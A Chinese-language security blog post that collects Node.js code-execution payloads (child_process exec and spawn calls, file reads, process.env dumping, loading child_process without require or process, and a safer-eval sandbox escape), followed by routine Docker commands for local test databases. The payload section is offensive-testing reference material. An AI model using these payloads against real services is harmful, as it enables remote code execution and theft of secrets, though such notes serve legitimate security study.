---
layout:     post
title:      Nodejs 代码执行利用 与 常见数据库的docker环境
subtitle:   简单小总结一下
date:       2020-12-8
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/75586588_p0.jpg
catalog: true
tags:
    - Nodejs
    - docker
---


## nodejs 代码执行利用



**贴一下之前总结关于nodejs利用的知识点**

```javascript
require("child_process").exec("whoami")toString() 
require("child_process").execSync("dir").toString()
```

windows

```javascript
require("child_process").execFileSync("cmd",["/C","dir"]).toString()
require("child_process").spawnSync("cmd",["/C","dir"])["output"][1].toString()
````

无回现

```javascript
require("child_process").spawn("cmd",["/C","calc"])
require("child_process").execFile("cmd",["/C","calc"]) //要运行的可执行文件的名称或路径。
```

列目录 

```javascript
require("fs").readdirSync('C:\\')
```

读文件

```javascript
require("fs").readFileSync("123.txt").toString()
```

利用 process 获取敏感信息

```javascript
process.env
process.cwd()
process.arch
process.version
process.geteuid()
```

没有require下引入模块

```javascript
global.process.mainModule.constructor._load('child_process').exec('calc')
```

没有process

```javascript
toString.constructor('return process')().mainModule.constructor._load('child_process').execSync('whoami')
```

绕过沙盒
safer-eval

```javascript
toString.constructor('return process')().mainModule.constructor._load('child_process').execSync('whoami')
```





## Docker-常见数据库的快速搭建



### mysql8



```bash
docker run -dit --name mysql8 -e MYSQL_ROOT_PASSWORD=password haakco/mysql80
```

```bash
docker exec -it mysql8 bash -c "mysql -u root -p"
```



开启远程连接

```sql
ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password by 'password';
```





### PostgreSQL



```bash
docker run --name postgresql -itd --restart always   --publish 5432:5432   --volume postgresql:/var/lib/postgresql   sameersbn/postgresql:12-20200524
```

```bash
docker exec -it postgresql sudo -u postgres psql
```





### Mssql

需要内存较高

```bash
docker run --name mssql -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=password' -e 'MSSQL_PID=Express' -p 1433:1433 -d microsoft/mssql-server-linux
```



```bash
docker exec -it mssql /opt/mssql-tools/bin/sqlcmd -S localhost -U sa -P password
```



### Redis



```bash
docker run --name some-redis -d redis
```

```bash
docker exec -it some-redis redis-cli
```





### Sqlite3

```bash
 docker run --name sqlite3  -it nouchka/sqlite3 sqlite3
```



### Oracle

```bash
docker pull alexeiled/docker-oracle-xe-11g
```



```bash
docker run -h "oracle" --name "oracle" -d -p 49160:22 -p 49161:1521 -p 49162:8080 alexeiled/docker-oracle-xe-11g
```



```bash
docker exec -it oracle bash 
```

进入docker 执行

```bash
sqlplus system/oracle
```



### MongoDB

构建

```bash
docker run -d \
    --name mongodb \
    -p 27017:27017 \
    -e MONGODB_USERNAME=myusername \
    -e MONGODB_PASSWORD=mypassword \
    frodenas/mongodb
```



运行

```bash
 docker exec -it mongodb /bin/bash -c 'mongo 127.0.0.1/admin -u myusername -p
```


```bash
MongoDB shell version: 3.0.7
Enter password: 
connecting to: 127.0.0.1/admin
>mypassword
```

